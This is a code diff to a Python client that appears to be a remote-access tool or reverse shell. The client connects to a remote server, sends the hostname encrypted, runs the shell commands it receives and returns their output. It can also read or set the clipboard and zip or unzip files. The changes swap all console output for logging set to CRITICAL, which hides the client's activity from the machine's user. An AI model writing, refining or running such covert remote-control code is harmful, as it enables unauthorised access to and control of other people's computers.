@@ -7,10 +7,13 @@ import struct
 import subprocess
 import sys
 import time
+import logging
 from multiprocessing import Process, Queue
 
 import requests
 from cryptography.fernet import Fernet
+
+logging.basicConfig(level=logging.CRITICAL)
 
 commands = '\nAvaliable Modules\n'
 
@@ -24,7 +27,7 @@ try:
     commands += '- key/fclip {Text} (Fills clipboard)\n'
     _pyperclip = True
 except Exception as e:
-    print(f'pyperclip not installed: {e}')
+    logging.debug(f'pyperclip not installed: {e}')
     _pyperclip = False
 
 try:
@@ -33,7 +36,7 @@ try:
     commands += '- zip {file} ( Zips a file)\n'
     _zipfile = True
 except Exception as e:
-    print(f'zipfile import error: {e}')
+    logging.debug(f'zipfile import error: {e}')
     _zipfile = False
 
 def shell(q, data):
@@ -77,7 +80,7 @@ class Client(object):
                 self.socket.shutdown(2)
                 self.socket.close()
             except Exception as e:
-                print('Could not close connection %s' % str(e))
+                logging.error('Could not close connection %s' % str(e))
                 # continue
         sys.exit(0)
         return
@@ -87,7 +90,7 @@ class Client(object):
         try:
             self.socket = socket.socket()
         except socket.error as e:
-            print("Socket creation error" + str(e))
+            logging.error("Socket creation error" + str(e))
             return
         return
 
@@ -96,22 +99,25 @@ class Client(object):
         try:
             self.socket.connect((self.serverHost, self.serverPort))
         except socket.error as e:
-            print("Socket connection error: " + str(e))
+            logging.error("Socket connection error: " + str(e))
             time.sleep(5)
             raise
         try:
             encrypted_host = self.Crypt.encrypt(socket.gethostname().encode())
             self.socket.send(encrypted_host)
         except socket.error as e:
-            print("Cannot send hostname to server: " + str(e))
+            logging.error("Cannot send hostname to server: " + str(e))
             raise
         return
 
-    def print_output(self, output_str : str):
+    def print_output(self, output_str : str, add_cwd = True):
         """ Prints command output """
-        sent_message = self.Crypt.encrypt((output_str + str(os.getcwd()) + '> ').encode())
+        logging.debug(f'Sending data:{output_str}')
+        if add_cwd:
+            output_str = output_str + str(os.getcwd()) + '> '
+        sent_message = self.Crypt.encrypt(output_str.encode())
         self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
-        print(output_str)
+        logging.debug(f'Sending Encypted data: {output_str}')
         return
 
 
@@ -163,28 +169,24 @@ class Client(object):
         if data[:9].lower() == 'key/gclip':
             if _pyperclip:
                 return pyperclip.paste()
-            else:
-                return "key/gclip not avaliable: pyperclip import failed"
+            return "key/gclip not avaliable: pyperclip import failed"
         if data[:9].lower() == 'key/fclip':
             if _pyperclip:
                 pyperclip.copy(data[10:])
                 return "Copied to clipboard successfully."
-            else:
-                return "key/fclip not avaliable: pyperclip import failed"
+            return "key/fclip not avaliable: pyperclip import failed"
         if data[:3].lower() == 'zip':
             if _zipfile:
                 output_file = os.path.splitext(data[4:])[0] + ".zip"
                 zipfile.ZipFile(os.path.splitext(data[4:])[0] + ".zip", mode='w').write(data[4:])
                 return f"{data[4:]} zipped to {output_file}"
-            else:
-                return "zip not avaliable: zipfile import failed"
+            return "zip not avaliable: zipfile import failed"
         if data[:5].lower() == 'unzip':
             if _zipfile:
                 with zipfile.ZipFile(data[6:], 'r') as f:
                     f.extractall(pathlib.Path().absolute())
                 return f"Extracted {data[6:]} to {pathlib.Path().absolute()}"
-            else:
-                return "unzip not avaliable: zipfile import failed"
+            return "unzip not avaliable: zipfile import failed"
         return None
 
 
@@ -193,27 +195,23 @@ class Client(object):
         try:
             self.socket.recv(1024)
         except Exception as e:
-            print('Could not start communication with server: %s\n' %str(e))
+            logging.error('Could not start communication with server: %s\n' %str(e))
             return
         cwd = self.Crypt.encrypt(str(os.getcwd() + '> ').encode())
+        logging.debug(f'Sending data: {cwd}')
         self.socket.send(struct.pack('>I', len(cwd)) + cwd)
         while True:
             output_str = None
             data = self.socket.recv(20480)
-            if data == b'':
-                break
-            if data == b' ':
-                self.print_output(' ')
-                break
+            logging.debug(f'Received data: {data}')
             try:
                 data = self.Crypt.decrypt(data)
+                logging.debug(f'Decrypted data: {data}')
             except Exception as e:
-                print(f"Decryption Error: {e}")
+                logging.error(f"Decryption Error: {e}")
                 break
-            if data == b' ':
-                self.print_output(' ')
-                continue
             if data[:].decode().lower() == 'quit':
+                self.print_output('Quitting...\n', add_cwd=False)
                 self.socket.close()
                 break
             try:
@@ -230,12 +228,16 @@ class Client(object):
                     output_str = "Command took too long... Will keep running in background."
                 else:
                     output_str = self.q.get()
+                    self.Threads.pop(-1)
 
-            if output_str is not None:
-                try:
+            try: 
+                if output_str is not None:
                     self.print_output(output_str + "\n")
-                except Exception as e:
-                    print('Cannot send command output: %s' %str(e))
+                else:
+                    self.print_output(' ')
+            except Exception as e:
+                logging.error('Cannot send command output: %s' %str(e))
+
         self.socket.close()
         return
 
@@ -247,14 +249,14 @@ def main():
         try:
             client.socket_connect()
         except Exception as e:
-            print("Error on socket connections: %s" %str(e))
+            logging.error("Error on socket connections: %s" %str(e))
             time.sleep(5)     
         else:
             break
     try:
         client.receive_commands()
     except Exception as e:
-        print('Error in main: ' + str(e))
+        logging.critical('Error in main: ' + str(e))
     client.socket.close()
     return
 
